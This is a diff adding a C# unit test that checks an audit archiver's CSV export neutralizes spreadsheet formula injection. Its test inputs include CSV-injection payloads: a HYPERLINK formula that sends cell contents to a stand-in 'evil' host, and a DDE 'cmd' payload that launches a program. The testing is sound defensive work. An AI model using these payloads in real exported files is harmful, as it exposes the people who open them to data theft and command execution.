@@ -80,6 +80,53 @@ public class S3AuditArchiverTests
             default), Times.Once);
     }
 
+    [Theory]
+    [InlineData("=HYPERLINK(\"https://evil/\"&A1)", "'=HYPERLINK(\"\"https://evil/\"\"&A1)")]
+    [InlineData("+1+cmd|' /C calc'!A0", "'+1+cmd|' /C calc'!A0")]
+    [InlineData("-2+3", "'-2+3")]
+    [InlineData("@SUM(1,2)", "'@SUM(1,2)")]
+    [InlineData("\t=1+1", "'\t=1+1")]
+    [InlineData("\r=1+1", "'\r=1+1")]
+    [InlineData("\n=1+1", "'\n=1+1")]
+    [InlineData("u1", "u1")]
+    [InlineData("a=b", "a=b")]
+    public async Task ExportAsync_WithCsvFormat_ShouldNeutralizeFormulaCells(string payload, string expectedCell)
+    {
+        var from = DateTime.UtcNow.AddDays(-7);
+        var to = DateTime.UtcNow;
+        var events = new List<AuditEvent>
+        {
+            new()
+            {
+                Id = "e1", UserId = payload, Action = payload, ResourceType = payload,
+                ResourceId = payload, IpAddress = payload, UserAgent = payload, Timestamp = DateTime.UtcNow,
+            },
+        };
+
+        string? body = null;
+        _mockRepository.Setup(r => r.GetEventsByDateRangeAsync(from, to)).ReturnsAsync(events);
+        _mockS3.Setup(s => s.PutObjectAsync(It.IsAny<PutObjectRequest>(), default))
+            .Callback<PutObjectRequest, CancellationToken>((req, _) => body = req.ContentBody)
+            .ReturnsAsync(new PutObjectResponse());
+
+        await _archiver.ExportAsync(from, to, "csv");
+
+        Assert.NotNull(body);
+        var dataRow = body![(body.IndexOf('\n') + 1)..];
+        var quoted = $"\"{expectedCell}\"";
+        Assert.Equal(6, CountOccurrences(dataRow, $",{quoted}"));
+    }
+
+    private static int CountOccurrences(string haystack, string needle)
+    {
+        var count = 0;
+        for (var i = haystack.IndexOf(needle, StringComparison.Ordinal); i >= 0; i = haystack.IndexOf(needle, i + needle.Length, StringComparison.Ordinal))
+        {
+            count++;
+        }
+        return count;
+    }
+
     [Fact]
     public async Task ArchiveOldEventsAsync_WithEvents_ShouldUploadToGlacierAndDelete()
     {
